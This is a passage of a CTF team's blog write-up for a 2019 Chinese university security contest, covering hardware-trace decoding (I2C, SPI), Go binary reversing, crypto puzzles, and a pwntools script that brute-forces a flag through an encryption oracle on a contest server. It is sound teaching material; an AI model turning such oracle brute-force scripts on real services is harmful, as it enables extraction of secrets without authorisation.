class="line">0.948444500000000,I2C,- + ACK</div><div class="line">0.948608000000000,I2C,e + ACK</div><div class="line">0.948771500000000,I2C,9 + ACK</div><div class="line">0.948935500000000,I2C,b + ACK</div><div class="line">0.949099000000000,I2C,5 + ACK</div><div class="line">0.949262500000000,I2C,- + ACK</div><div class="line">0.949426000000000,I2C,4 + ACK</div><div class="line">0.949589500000000,I2C,d + ACK</div><div class="line">0.949753000000000,I2C,9 + ACK</div><div class="line">0.949917000000000,I2C,0 + ACK</div><div class="line">0.950080500000000,I2C,- + ACK</div><div class="line">0.950244000000000,I2C,a + ACK</div><div class="line">0.950407500000000,I2C,8 + ACK</div><div class="line">0.950571000000000,I2C,8 + ACK</div><div class="line">0.950734500000000,I2C,3 + ACK</div><div class="line">0.950898000000000,I2C,- + ACK</div><div class="line">0.951061500000000,I2C,4 + ACK</div><div class="line">0.951225000000000,I2C,1 + ACK</div><div class="line">0.951388500000000,I2C,c + NAK</div><div class="line">5.946480500000000,I2C,Setup Write to [&apos;160&apos;] + ACK</div><div class="line">5.946647000000000,I2C,\t + ACK</div><div class="line">5.946813500000000,I2C,a + ACK</div><div class="line">5.946980000000000,I2C,c + ACK</div></pre></td></tr></table></figure>
<p>这个神奇的地方在于在接收完后又进行了修改，但是修改哪个地方是很大的问题。制表符一般会跳过 8 个字节，我其实也没想通为什么是这样，不过我尝试了 n 多次，最后终于试出来改变的位置了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;c46dac10-e9b5-4d90-a883-41cf163bdf4e&#125;</div></pre></td></tr></table></figure>
<h2 id="usbasp"><a href="#usbasp" class="headerlink" title="usbasp"></a>usbasp</h2><p>用之前提供的软件，将协议切换为 SPI，其中的设置修改这里：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Enable line is active high</div></pre></td></tr></table></figure>
<p>可以得到如下输出：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line">Time [s],Packet ID,MOSI,MISO</div><div class="line">1.474939400000000,,f,&apos;0&apos;</div><div class="line">1.474945500000000,,l,&apos;0&apos;</div><div class="line">1.474951600000000,,a,&apos;0&apos;</div><div class="line">1.474957700000000,,g,&apos;0&apos;</div><div class="line">1.474963800000000,,&#123;,&apos;0&apos;</div><div class="line">1.474969900000000,,8,&apos;0&apos;</div><div class="line">1.474976000000000,,5,5</div><div class="line">1.474982100000000,,b,&apos;0&apos;</div><div class="line">1.474988300000000,,0,&apos;0&apos;</div><div class="line">1.474994400000000,,8,&apos;0&apos;</div><div class="line">1.475000500000000,,4,&apos;0&apos;</div><div class="line">1.475006600000000,,c,&apos;0&apos;</div><div class="line">1.475012700000000,,6,6</div><div class="line">1.475018800000000,,-,-</div><div class="line">1.475024900000000,,4,&apos;0&apos;</div><div class="line">1.475031100000000,,2,&apos;0&apos;</div><div class="line">1.475037200000000,,e,&apos;0&apos;</div><div class="line">1.475043300000000,,6,&apos;0&apos;</div><div class="line">1.475049400000000,,-,&apos;0&apos;</div><div class="line">1.475055500000000,,4,&apos;0&apos;</div><div class="line">1.475061600000000,,9,9</div><div class="line">1.475067700000000,,5,&apos;5&apos;</div><div class="line">1.475073900000000,,c,&apos;0&apos;</div><div class="line">1.475080000000000,,-,&apos;0&apos;</div><div class="line">1.475086100000000,,8,&apos;0&apos;</div><div class="line">1.475092200000000,,7,&apos;0&apos;</div><div class="line">1.475098300000000,,b,&apos;0&apos;</div><div class="line">1.475104400000000,,4,0</div><div class="line">1.475110500000000,,-,-</div><div class="line">1.475116600000000,,4,&apos;4&apos;</div><div class="line">1.475122800000000,,6,&apos;0&apos;</div><div class="line">1.475128900000000,,d,&apos;0&apos;</div><div class="line">1.475135000000000,,f,&apos;0&apos;</div><div class="line">1.475141100000000,,b,&apos;0&apos;</div><div class="line">1.475147200000000,,1,&apos;0&apos;</div><div class="line">1.475153300000000,,d,d</div><div class="line">1.475159400000000,,f,f</div><div class="line">1.475165500000000,,5,&apos;1&apos;</div><div class="line">1.475171700000000,,8,&apos;0&apos;</div><div class="line">1.475177800000000,,a,&apos;0&apos;</div><div class="line">1.475183900000000,,0,&apos;0&apos;</div><div class="line">1.475190000000000,,&#125;,&apos;0&apos;</div><div class="line">1.475196100000000,,&apos;0&apos;,&apos;0&apos;</div></pre></td></tr></table></figure>
<p>就可以得到 flag 了。</p>
<h1 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h1><h2 id="easyGo"><a href="#easyGo" class="headerlink" title="easyGo"></a>easyGo</h2><p>用 <a href="https://github.com/sibears/IDAGolangHelper" target="_blank" rel="external">IDAGolangHelper</a> 以 Go1.10 版本恢复符号后，动态调试。</p>
<p>在 base64 解码之后下断点，大概位置在：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">.text:00000000004952EB                 call    encoding_base64__ptr_Encoding_DecodeString ; encoding_base64__ptr_Encoding_DecodeString</div><div class="line">.text:00000000004952F0                 mov     rax, [rsp+100h+var_C8]</div><div class="line">.text:00000000004952F5                 mov     rcx, [rsp+100h+var_D0]</div><div class="line">.text:00000000004952FA                 mov     rdx, [rsp+100h+var_E8]</div><div class="line">.text:00000000004952FF                 mov     rbx, [rsp+100h+var_E0]</div><div class="line">.text:0000000000495304                 test    rcx, rcx</div><div class="line">.text:0000000000495307                 jnz     loc_49541B</div></pre></td></tr></table></figure>
<p>处。此时查看 rdx 寄存器会发现里面保存着 flag。</p>
<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1g29y0gp6a7j20hg07zgss.jpg" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;92094daf-33c9-431e-a85a-8bfbd5df98ad&#125;</div></pre></td></tr></table></figure>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="puzzles"><a href="#puzzles" class="headerlink" title="puzzles"></a>puzzles</h2><p>question 0 解多元方程<br>a1=4006,a2=3053,a3=2503,a4=2560 0xfa6 bed 9c7 a00<br>question 1<br>前1个和后面2个分别是质数序列上的等差数列，推测出part1<br>part1=26365399 0x1924dd7<br>后面3个就是大物高数问题，直接求解答案<br>question 2<br>part2=(1+6^3-5^3+7+1)*77=7700 0x1e14<br>question 3<br>part3=18640 0x48d0</p>
<p>question 4<br>part4=120*336=40320 0x9d80<br>最后合并起来获得flag</p>
<h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>阅读源码会发现，输入空可以得到 flag 的加密值，我们可以因此爆破 flag。</p>
<p>爆破脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line">p = remote(<span class="string">'fc32f84bc46ac22d97e5f876e3100922.kr-lab.com'</span>, <span class="number">12345</span>)</div><div class="line">strtable = [<span class="string">'-'</span>,<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>,<span class="string">'E'</span>,<span class="string">'F'</span>,<span class="string">'G'</span>,<span class="string">'H'</span>,<span class="string">'I'</span>,<span class="string">'J'</span>,<span class="string">'K'</span>,<span class="string">'L'</span>,<span class="string">'M'</span>,<span class="string">'N'</span>,<span class="string">'O'</span>,<span class="string">'P'</span>,<span class="string">'Q'</span>,<span class="string">'R'</span>,<span class="string">'S'</span>,<span class="string">'T'</span>,<span class="string">'U'</span>,<span class="string">'V'</span>,<span class="string">'W'</span>,<span class="string">'X'</span>,<span class="string">'Y'</span>,<span class="string">'Z'</span>,<span class="string">'_'</span>,<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'&#123;'</span>,<span class="string">'&#125;'</span>]</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'plaintext&gt;'</span>)</div><div class="line"><span class="comment"># exit(0)</span></div><div class="line">p.sendline(<span class="string">''</span>)</div><div class="line">p.recvuntil(<span class="string">'result&gt;'</span>)</div><div class="line">flagstr = p.recvline()</div><div class="line">myflag = <span class="string">''</span></div><div class="line">count = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="keyword">while</span> count&lt;len(flagstr):</div><div class="line">    sli = flagstr[count:count+<span class="number">2</span>]</div><div class="line">    p.recvuntil(<span class="string">'plaintext&gt;'</span>)</div><div class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> strtable:</div><div class="line">        p.sendline(myflag+ch)</div><div class="line">        p.recvuntil(<span class="string">'result&gt;'</span>)</div><div class="line">        retflag = p.recvline()</div><div class="line">        <span class="comment"># print retflag</span></div><div class="line">        retsli = retflag[count:count+<span class="number">2</span>]</div><div class="line">        <span class="keyword">if</span> retsli == sli:</div><div class="line">            myflag=myflag+ch</div><div class="line">            <span class="keyword">print</span> myflag</div><div class="line">            <span class="keyword">break</span></div><div class="line">    count = count + <span class="number">2</span></div></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://asuri.org/2019/04/22/Asuri_2019/" data-id="ckhkqui2e000m4soluv62xywr" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2019/07/30/2019-googlectf-writeup-part1/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          2019-googlectf-writeup-part1
        
      </div>
    </a>
  
  
    <a href="/2019/04/11/PHP复杂变量/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">从一道题讲PHP复杂变量</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/">Develop</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Devops/">Devops</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/">Pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Reverse/">Reverse</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web-安全/">Web 安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Writeup/">Writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/安卓安全/">安卓安全</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE-2015-3864/">CVE-2015-3864</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ROP/">ROP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Rev/">Rev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tools/">Tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/">Windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/analytics/">analytics</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/googlectf/">googlectf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jctf/">jctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mirai/">mirai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nuaactf/">nuaactf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/phantom/">phantom</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/qzone/">qzone</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/suctf/">suctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virus/">virus</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件格式漏洞/">文件格式漏洞</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CVE-2015-3864/" style="font-size: 10px;">CVE-2015-3864</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Pwn/" style="font-size: 15px;">Pwn</a> <a href="/tags/RCE/" style="font-size: 15px;">RCE</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/Rev/" style="font-size: 10px;">Rev</a> <a href="/tags/Tools/" style="font-size: 15px;">Tools</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/analytics/" style="font-size: 10px;">analytics</a> <a href="/tags/googlectf/" style="font-size: 15px;">googlectf</a> <a href="/tags/jctf/" style="font-size: 10px;">jctf</a> <a href="/tags/linux/" style="font-size: 15px;">linux</a> <a href="/tags/mirai/" style="font-size: 10px;">mirai</a> <a href="/tags/nuaactf/" style="font-size: 15px;">nuaactf</a> <a href="/tags/phantom/" style="font-size: 10px;">phantom</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/qzone/" style="font-size: 10px;">qzone</a> <a href="/tags/reverse/" style="font-size: 10px;">reverse</a> <a href="/tags/suctf/" style="font-size: 10px;">suctf</a> <a href="/tags/virus/" style="font-size: 10px;">virus</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 20px;">writeup</a> <a href="/tags/xss/" style="font-size: 15px;">xss</a> <a href="/tags/文件格式漏洞/" style="font-size: 10px;">文件格式漏洞</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1970/01/">January 1970</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2019/07/30/2019-googlectf-writeup-part2/">2019-googlectf-writeup-part2</a>
          </li>
        
          <li>
            <a href="/2019/07/30/2019-googlectf-writeup-part1/">2019-googlectf-writeup-part1</a>
          </li>
        
          <li>
            <a href="/2019/04/22/Asuri_2019/">2019 第十二届全国大学生信息安全竞赛—创新实践能力赛线上赛-Asuri 2019 wp</a>
          </li>
        
          <li>
            <a href="/2019/04/11/PHP复杂变量/">从一道题讲PHP复杂变量</a>
          </li>
        
          <li>
            <a href="/2019/03/12/命令执行到提权/">命令执行到提权</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 All Members<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>

  </div>
</body>
</html>